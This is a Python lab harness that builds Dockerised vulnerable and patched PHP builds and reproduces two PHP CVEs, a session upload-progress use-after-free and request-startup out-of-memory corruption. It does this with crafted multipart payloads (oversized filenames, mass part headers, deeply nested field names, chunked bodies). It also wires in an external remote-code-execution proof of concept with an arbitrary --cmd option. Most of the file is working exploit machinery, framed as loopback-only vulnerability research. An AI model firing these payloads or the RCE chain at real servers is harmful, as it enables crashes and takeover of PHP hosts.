#!/usr/bin/env python3
"""php2shell — reproducible labs for CVE-2026-109619 and CVE-2026-109618.

109619  Stale global state. A multipart body is parsed in php_hash_environment()
        before PHP_RINIT_FUNCTION(basic). If serialising the upload-progress
        session data exhausts memory_limit, the fatal bails out before RINIT, so
        BG(serialize) keeps level=1 and a pointer to a context that request
        shutdown frees. The next request on the same worker reuses it as a live
        HashTable. Ported from RemiPelloux/php-session-upload-progress-uaf.

109618  OOM corruption. Handling OOM with longjmp during request startup leaves
        partially initialised request memory behind; shutdown then reads or
        branches on it. Vectors follow the PHP advisory: multipart headers whose
        in-memory representation dwarfs their wire size, deeply nested field
        names, and bodies without a usable Content-Length.

Both labs build 8.5.11 (vulnerable) and 8.5.12 (fixed) from the same source and
flags, so a behavioural difference is a PHP difference.

Commands:
  up [--only 109619|109618|109619-rce]
  down                        stop and remove
  109619 [--php V] [--control]
  109619-rce [--php 8.4.26|8.4.27] [--fetch]
                              end-to-end RCE with the pinned 9bie PoC
  109618 [--php V] [--vector headers|nested|chunked] [--repeat N]
  verify [--all]              run the positive/negative matrix

Loopback only. Run against infrastructure you own.
"""

from __future__ import annotations

import argparse
import contextlib
import hashlib
import http.client
import io
import secrets
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path

HOST = "127.0.0.1"
BASE = Path(__file__).resolve().parent
LAB = BASE / "lab"
TEMPLATES = BASE / "templates"
BOUNDARY = "----php2shellboundary"

PROJECT = "php2shell-" + hashlib.sha1(str(BASE).encode()).hexdigest()[:8]

PORTS = {
    ("109619", "8.5.11"): 18119,
    ("109619", "8.5.12"): 18120,
    ("109619-fpm", "8.5.11"): 18121,
    ("109619-fpm", "8.5.12"): 18122,
    ("109618", "8.5.11"): 18118,
    ("109618", "8.5.12"): 18117,
    ("109618-asan", "8.5.11"): 18123,
    ("109619-rce", "8.4.26"): 18124,
    ("109619-rce", "8.4.27"): 18125,
    ("109619-rce", "8.2.34"): 18126,
    ("109619-rce", "8.5.12"): 18127,
}
SERVICES = {
    ("109619", "8.5.11"): "php8511",
    ("109619", "8.5.12"): "php8512",
    ("109619-fpm", "8.5.11"): "fpm8511",
    ("109619-fpm", "8.5.12"): "fpm8512",
    ("109618", "8.5.11"): "apache8511",
    ("109618", "8.5.12"): "apache8512",
    ("109618-asan", "8.5.11"): "apache-asan8511",
    ("109619-rce", "8.4.26"): "apache8426",
    ("109619-rce", "8.4.27"): "apache8427",
    ("109619-rce", "8.2.34"): "apache8234",
    ("109619-rce", "8.5.12"): "apache8512rce",
}
VERSIONS = ("8.5.11", "8.5.12")
RCE_PIN = "4586f5cc120c82fd468b17469202bac629810ad9"
RCE_URL = "https://github.com/9bie/php2shell-bypass-aslr-exp"
RCE_DIR = LAB / "third_party" / "9bie"


# ---------------------------------------------------------------------------
# lab lifecycle
# ---------------------------------------------------------------------------
def render() -> None:
    """Copy templates into lab/ without replacing the directories themselves:
    running containers bind-mount lab/webroot, and rmtree would leave them
    pointing at a deleted inode (every request then 404s)."""
    LAB.mkdir(parents=True, exist_ok=True)
    for name in (
        "Dockerfile.cli",
        "Dockerfile.apache",
        "Dockerfile.apache-asan",
        "Dockerfile.fpm",
        "apache.conf",
        "php-fpm.conf",
        "php-fpm-pool.conf",
        "nginx-8511.conf",
        "nginx-8512.conf",
        "php-8426.ini",
        "apache-8426.conf",
        "zend-alloc-limit.patch",
        "compose.yml",
    ):
        shutil.copy2(TEMPLATES / name, LAB / name)

    # The 9bie PoC runs as www-data and writes the proof into /out.
    for name in ("out-rce", "out-rce-fixed", "out-rce-8234", "out-rce-8512"):
        out = LAB / name
        out.mkdir(exist_ok=True)
        with contextlib.suppress(PermissionError):
            out.chmod(0o777)

    src = TEMPLATES / "webroot"
    dst = LAB / "webroot"
    dst.mkdir(exist_ok=True)
    wanted = {p.name for p in src.iterdir()}
    for stale in dst.iterdir():
        if stale.name not in wanted:
            stale.unlink()
    for item in src.iterdir():
        shutil.copy2(item, dst / item.name)


def compose(*args: str, check: bool = True, timeout: int = 3600) -> subprocess.CompletedProcess:
    cmd = ["docker", "compose", "-p", PROJECT, "-f", str(LAB / "compose.yml"), *args]
    res = subprocess.run(cmd, cwd=LAB, text=True, capture_output=True, timeout=timeout)
    if check and res.returncode != 0:
        tail = (res.stderr or res.stdout).strip().splitlines()[-6:]
        raise SystemExit("docker compose " + " ".join(args) + " failed:\n  " + "\n  ".join(tail))
    return res


def up(only: str | None = None) -> None:
    render()
    if only == "109619-rce":
        print("pulling official images (php:8.4.26-apache; 8.4.27 optional)")
        compose("--profile", "109619-rce", "up", "-d", "--wait", "apache8426", timeout=900)
        print(f"[+] 109619-rce PHP 8.4.26: http://{HOST}:{PORTS[('109619-rce', '8.4.26')]}")
        return
    profiles = ["--profile", only] if only else ["--profile", "109619", "--profile", "109618"]
    print("building images (first run compiles PHP twice per version, be patient)")
    compose(*profiles, "up", "-d", "--build", "--force-recreate", "--wait", timeout=5400)
    for (lab, php), port in PORTS.items():
        if only is None or lab == only:
            print(f"[+] {lab} PHP {php}: http://{HOST}:{port}")


def down() -> None:
    compose("down", "-v", "--remove-orphans", check=False)


def cid(service: str) -> str:
    out = compose("ps", "-a", "-q", service, check=False).stdout.strip()
    return out.splitlines()[0] if out else ""


def running(service: str) -> bool:
    c = cid(service)
    if not c:
        return False
    res = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", c],
        text=True,
        capture_output=True,
        timeout=30,
    )
    return res.stdout.strip() == "true"


def exit_code(service: str) -> str:
    c = cid(service)
    if not c:
        return "?"
    res = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.ExitCode}}", c],
        text=True,
        capture_output=True,
        timeout=30,
    )
    return res.stdout.strip() or "?"


def logs(service: str, tail: int = 60) -> str:
    res = compose("logs", "--no-color", "--tail", str(tail), service, check=False)
    return res.stdout + res.stderr


def ensure_running(service: str) -> None:
    if running(service):
        return
    compose("up", "-d", service, timeout=900)
    for _ in range(60):
        c = cid(service)
        if c:
            fmt = "{{if .State.Health}}{{.State.Health.Status}}{{end}}"
            res = subprocess.run(
                ["docker", "inspect", "-f", fmt, c],
                text=True,
                capture_output=True,
                timeout=30,
            )
            if res.stdout.strip() == "healthy":
                return
        time.sleep(1)
    raise SystemExit(f"{service} did not become healthy; see `docker compose logs {service}`")


# ---------------------------------------------------------------------------
# wire format
# ---------------------------------------------------------------------------
def part(name: str, value: str) -> bytes:
    return (
        f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'
    ).encode()


def file_part(name: str, filename: str, data: bytes = b"Z") -> bytes:
    return (
        (
            f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="{name}"; '
            f'filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n'
        ).encode()
        + data
        + b"\r\n"
    )


def closing() -> bytes:
    return f"--{BOUNDARY}--\r\n".encode()


def content_type() -> str:
    return f"multipart/form-data; boundary={BOUNDARY}"


def post(
    port: int, body: bytes, path: str = "/probe.php", timeout: int = 30, sid: str | None = None
) -> tuple[int, bytes]:
    headers = {"Content-Type": content_type(), "Content-Length": str(len(body))}
    if sid:
        headers["Cookie"] = f"PHPSESSID={sid}"
    conn = http.client.HTTPConnection(HOST, port, timeout=timeout)
    try:
        conn.request("POST", path, body=body, headers=headers)
        res = conn.getresponse()
        return res.status, res.read()
    finally:
        conn.close()


def get(port: int, path: str, timeout: int = 30) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection(HOST, port, timeout=timeout)
    try:
        conn.request("GET", path)
        res = conn.getresponse()
        return res.status, res.read()
    finally:
        conn.close()


def post_chunked(
    port: int, chunks: list[bytes], path: str, timeout: int = 120
) -> tuple[int, bytes]:
    sock = socket.create_connection((HOST, port), timeout=timeout)
    try:
        sock.sendall(
            (
                f"POST {path} HTTP/1.1\r\nHost: {HOST}\r\n"
                f"Content-Type: {content_type()}\r\n"
                "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
            ).encode()
        )
        for chunk in chunks:
            sock.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        sock.sendall(b"0\r\n\r\n")
        raw = b""
        while True:
            data = sock.recv(65536)
            if not data:
                break
            raw += data
    finally:
        sock.close()
    head, _, body = raw.partition(b"\r\n\r\n")
    status = head.split(b" ")[1] if head.count(b" ") >= 1 else b"0"
    return int(status), body


# ---------------------------------------------------------------------------
# CVE-2026-109619
# ---------------------------------------------------------------------------
def arm_body(sid: str, filename_len: int) -> bytes:
    return part("PHP_SESSION_UPLOAD_PROGRESS", sid) + file_part("f", "A" * filename_len) + closing()


def fire_body(sid: str) -> bytes:
    return part("PHP_SESSION_UPLOAD_PROGRESS", sid) + closing()


def chain_109619(php: str, control: bool = False, timeout: int = 30, sapi: str = "cli") -> int:
    key = "109619" if sapi == "cli" else "109619-fpm"
    service = SERVICES[(key, php)]
    port = PORTS[(key, php)]
    ensure_running(service)

    sid = secrets.token_hex(16)
    filename_len = 2000 if control else 2_000_000
    r1 = "skipped (fpm uses the app-level producer)"
    if sapi == "cli":
        try:
            st1, _ = post(port, arm_body(sid, filename_len), "/probe.php", sid=sid)
            r1 = str(st1)
        except (OSError, http.client.HTTPException) as exc:
            r1 = f"error ({type(exc).__name__})"

    if sapi == "fpm":
        # The FPM producer runs in application execution, not in request
        # startup: an app-level OOM inside serialize() leaves BG(serialize)
        # dangling while the child survives. The consumer is the next
        # request's pre-RINIT upload-progress encode.
        try:
            st0, body0 = get(port, "/produce.php", timeout=timeout)
            produced = f"{st0} ({'OOM' if b'Allowed memory size' in body0 else 'no OOM'})"
        except (OSError, http.client.HTTPException) as exc:
            produced = f"error ({type(exc).__name__})"
        time.sleep(0.3)
        arm_log = logs(service, 20)
        arm_killed = "exited with code" in arm_log or "exited on signal" in arm_log
    else:
        produced = f"R1 {r1}"

    died = False
    try:
        st2, _ = post(port, fire_body(sid), "/probe.php", timeout=timeout, sid=sid)
        r2 = str(st2)
    except (OSError, http.client.HTTPException) as exc:
        r2 = f"connection died ({type(exc).__name__})"
        died = True

    time.sleep(0.4)
    alive = running(service)
    log = logs(service, 60)
    corrupt = "zend_mm_heap corrupted" in log or "heap-use-after-free" in log
    if sapi == "fpm":
        fired = (not arm_killed) and (died or corrupt or st2 in (500, 502))
    else:
        fired = died or not alive or corrupt

    print(f"[*] CVE-2026-109619 PHP {php} sapi={sapi}{' (control)' if control else ''}")
    if sapi == "fpm":
        print(f"    produce  {produced}")
        print(f"    child    {'died' if arm_killed else 'survived the app-level OOM'}")
    else:
        print(f"    R1 arm   {r1}  filename={filename_len} bytes, memory_limit=8M")
    print(f"    R2 fire  {r2}")
    if sapi == "fpm":
        state = "child died" if (fired or arm_killed) else ("alive" if alive else "dead")
        print(f"    worker   {state} (master {'alive' if alive else 'dead'})")
    else:
        print(f"    worker   {'alive' if alive else 'dead (exit ' + exit_code(service) + ')'}")
    for line in [ln for ln in log.splitlines() if "corrupt" in ln or "Fatal" in ln][-3:]:
        print(f"    log      {line.strip()}")
    if sapi == "fpm" and arm_killed:
        print("    verdict  NO REUSE — child died before the consumer request")
        return 3
    print(f"    verdict  {'FIRED — stale serialize context reused' if fired else 'SURVIVED'}")
    return 0 if fired else 1


# ---------------------------------------------------------------------------
# CVE-2026-109618
# ---------------------------------------------------------------------------
def headers_body(count: int) -> bytes:
    buf = io.BytesIO()
    buf.write(
        f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="f"; filename="x"\r\n'.encode()
    )
    for i in range(count):
        buf.write(b"X-%d: a\r\n" % i)
    buf.write(b"\r\n" + b"Z" * 1024 + b"\r\n")
    buf.write(closing())
    return buf.getvalue()


def emptyfiles_body(count: int) -> bytes:
    """Many file controls with an empty filename: they still create metadata
    arrays but do not count toward max_file_uploads (advisory vector)."""
    buf = io.BytesIO()
    for i in range(count):
        buf.write(
            (
                f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="f{i}"; '
                'filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n'
            ).encode()
        )
    buf.write(closing())
    return buf.getvalue()


def nested_body(depth: int, parts: int) -> bytes:
    name = "a" + "[k]" * depth
    buf = io.BytesIO()
    for _ in range(parts):
        buf.write(part(name, "v"))
    buf.write(closing())
    return buf.getvalue()


def chain_109618(
    php: str,
    vector: str = "headers",
    repeat: int = 1,
    timeout: int = 120,
    asan: bool = False,
    count: int = 200_000,
) -> int:
    key = "109618-asan" if asan else "109618"
    service = SERVICES[(key, php)]
    port = PORTS[(key, php)]
    ensure_running(service)
    before = logs(service, 2000)

    print(f"[*] CVE-2026-109618 PHP {php} vector={vector} repeat={repeat}{' asan' if asan else ''}")
    statuses: list[str] = []
    bodies: list[bytes] = []
    died = False
    for _ in range(repeat):
        try:
            if vector == "chunked":
                chunk = b"A" * (1024 * 1024)
                st, body = post_chunked(port, [chunk] * 48, "/index.php", timeout=timeout)
            elif vector == "emptyfiles":
                payload = emptyfiles_body(count)
                chunks = [payload[i : i + 1024 * 1024] for i in range(0, len(payload), 1024 * 1024)]
                st, body = post_chunked(port, chunks, "/index.php", timeout=timeout)
            elif vector == "nested":
                st, body = post(
                    port, nested_body(depth=64, parts=800), "/index.php", timeout=timeout
                )
            else:
                st, body = post(port, headers_body(count), "/index.php", timeout=timeout)
            statuses.append(str(st))
            bodies.append(body)
        except (OSError, http.client.HTTPException) as exc:
            statuses.append(f"died ({type(exc).__name__})")
            died = True
        time.sleep(0.3)

    time.sleep(0.5)
    new = logs(service, 4000)
    delta = new[len(before) :] if new.startswith(before) else new
    crash_markers = ("exit signal", "Segmentation fault", "Aborted", "zend_mm_heap corrupted")
    asan_markers = ("ERROR: AddressSanitizer", "heap-use-after-free", "heap-buffer-overflow")
    crashed = any(m.lower() in delta.lower() for m in crash_markers)
    asan_hit = any(m.lower() in delta.lower() for m in asan_markers)
    oom = any(b"Allowed memory size" in body for body in bodies)
    oom_only = oom and not crashed
    alive = running(service)

    print(f"    requests {', '.join(statuses)}")
    print(f"    worker   {'alive' if alive else 'dead'}")
    hits = [ln for ln in delta.splitlines() if any(m.lower() in ln.lower() for m in crash_markers)]
    for line in hits[-3:]:
        print(f"    log      {line.strip()[:160]}")
    if asan_hit:
        verdict = "ASAN — sanitizer caught the startup-OOM corruption"
    elif crashed:
        verdict = "CRASHED — request-startup OOM left invalid state behind"
    elif oom_only:
        verdict = "OOM ONLY — startup OOM reached, corruption not observed"
    elif died:
        verdict = "CONNECTION DIED — no crash marker in the log"
    else:
        verdict = "CLEAN — no OOM, no crash"
    print(f"    verdict  {verdict}")
    return 0 if (crashed or asan_hit) else (2 if oom_only else 1)


# ---------------------------------------------------------------------------
# 109619 RCE — external PoC, pinned
# ---------------------------------------------------------------------------
def fetch_9bie() -> None:
    script = BASE / "scripts" / "fetch-9bie.sh"
    subprocess.run(["sh", str(script)], check=True, timeout=600)


def chain_109619_rce(
    php: str = "8.4.26", fetch: bool = False, cmd: str | None = None, retries: int = 3
) -> int:
    """Run the 9bie chain against the official image.

    The exploit is not vendored (upstream has no license); scripts/fetch-9bie.sh
    clones it at RCE_PIN. It needs display_errors=On, memory_limit=8M and a
    single prefork worker, which is what templates/php-8426.ini and
    templates/apache-8426.conf provide.
    """
    if fetch:
        fetch_9bie()
    exe = RCE_DIR / "exploit.py"
    if not exe.exists():
        raise SystemExit(
            f"missing {exe}\n"
            "run: sh scripts/fetch-9bie.sh   (or: python3 php2shell.py 109619-rce --fetch)"
        )

    key = ("109619-rce", php)
    service, port = SERVICES[key], PORTS[key]
    render()
    compose("--profile", "109619-rce", "up", "-d", "--wait", service, timeout=900)
    container = cid(service)
    out = LAB / {
        "8.4.26": "out-rce",
        "8.4.27": "out-rce-fixed",
        "8.2.34": "out-rce-8234",
        "8.5.12": "out-rce-8512",
    }[php]
    proof = out / "p1"
    proof.unlink(missing_ok=True)
    offsets = out / "offsets.env"
    offsets.unlink(missing_ok=True)

    cmdline = [
        sys.executable,
        str(exe),
        "-u",
        f"http://{HOST}:{port}/probe.php",
        "--docker-container",
        container,
        "--offsets-file",
        str(offsets),
        "--proof-file",
        str(proof),
        "--profile",
        "bookworm",
        "--retries",
        str(retries),
    ]
    if cmd:
        cmdline += ["--cmd", cmd]
    print(f"[*] {php} container {container[:12]} -> http://{HOST}:{port}/probe.php")
    res = subprocess.run(cmdline, cwd=RCE_DIR, text=True, capture_output=True, timeout=900)
    if res.stdout.strip():
        print(res.stdout.strip())
    if res.returncode != 0 and res.stderr.strip():
        print(res.stderr.strip(), file=sys.stderr)

    if proof.exists():
        print(f"\nPROOF ({php}): {proof.read_text().strip()}")
        return 0
    if cmd and res.returncode == 0:
        print(f"\nRCE OK ({php}), no proof file (custom --cmd)")
        return 0
    print(f"\nNO PROOF ({php}) — exploit exit {res.returncode}")
    return 2


# ---------------------------------------------------------------------------
# verify
# ---------------------------------------------------------------------------
def verify(all_labs: bool = False) -> int:
    rows: list[tuple[str, str, str, str, bool]] = []

    got = chain_109619("8.5.11")
    rows.append(("109619", "8.5.11", "FIRED" if got == 0 else "SURVIVED", "FIRED", got == 0))
    got = chain_109619("8.5.12")
    rows.append(("109619", "8.5.12", "FIRED" if got == 0 else "SURVIVED", "SURVIVED", got != 0))

    if all_labs:
        labels = {0: "CRASHED", 2: "OOM", 1: "CLEAN"}
        got = chain_109618("8.5.11", "headers")
        rows.append(("109618", "8.5.11", labels[got], "OOM", got == 2))
        got = chain_109618("8.5.12", "headers")
        rows.append(("109618", "8.5.12", labels[got], "CLEAN", got == 1))

    print("\nlab      php      result      expected    pass")
    ok = True
    for lab, php, result, expected, passed in rows:
        print(f"{lab:<8} {php:<8} {result:<11} {expected:<11} {'yes' if passed else 'NO'}")
        ok = ok and passed
    if all_labs:
        print(
            "\nnote: 109618 reproduces the pre-auth startup OOM on 8.5.11 and shows the fixed\n"
            "      build no longer reaching it; the corruption/RCE is not reproduced."
        )
    return 0 if ok else 1


# ---------------------------------------------------------------------------
# cli
# ---------------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(
        description="CVE-2026-109619 / CVE-2026-109618 labs (loopback only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = ap.add_subparsers(dest="action", required=True)

    p = sub.add_parser("up", help="build and start the labs")
    p.add_argument("--only", choices=["109619", "109618", "109619-rce"], default=None)

    sub.add_parser("gen", help="render lab/ without starting anything (CI)")

    sub.add_parser("down", help="stop and remove the labs")

    p = sub.add_parser("109619", help="run the stale-global-state chain")
    p.add_argument("--php", choices=VERSIONS, default="8.5.11")
    p.add_argument("--sapi", choices=["cli", "fpm"], default="cli")
    p.add_argument("--control", action="store_true", help="small filename: no OOM, expect no crash")
    p.add_argument("--timeout", type=int, default=30)

    p = sub.add_parser("109619-rce", help="RCE with the pinned 9bie PoC (8.4.26 vulnerable)")
    p.add_argument("--php", choices=["8.4.26", "8.4.27", "8.2.34", "8.5.12"], default="8.4.26")
    p.add_argument("--fetch", action="store_true", help="clone/update the pinned PoC first")
    p.add_argument("--cmd", default=None, help="command to run (<=14 bytes, or sh</out/c)")
    p.add_argument("--retries", type=int, default=3)

    p = sub.add_parser("109618", help="run the request-startup OOM chain")
    p.add_argument("--php", choices=VERSIONS, default="8.5.11")
    p.add_argument(
        "--vector", choices=["headers", "nested", "chunked", "emptyfiles"], default="headers"
    )
    p.add_argument("--repeat", type=int, default=1)
    p.add_argument("--timeout", type=int, default=120)
    p.add_argument("--asan", action="store_true", help="target the ASAN mod_php build (8.5.11)")
    p.add_argument("--count", type=int, default=200_000, help="part headers for --vector headers")

    p = sub.add_parser("verify", help="run the positive/negative matrix")
    p.add_argument("--all", action="store_true", help="include the 109618 lab")

    args = ap.parse_args()
    if args.action == "up":
        up(args.only)
        return 0
    if args.action == "gen":
        render()
        print("lab rendered:", ", ".join(sorted(p.name for p in LAB.iterdir())))
        return 0
    if args.action == "down":
        down()
        return 0
    if args.action == "109619":
        return chain_109619(args.php, args.control, args.timeout, args.sapi)
    if args.action == "109619-rce":
        return chain_109619_rce(args.php, args.fetch, args.cmd, args.retries)
    if args.action == "109618":
        return chain_109618(args.php, args.vector, args.repeat, args.timeout, args.asan, args.count)
    if args.action == "verify":
        return verify(args.all)
    return 2


if __name__ == "__main__":
    sys.exit(main())
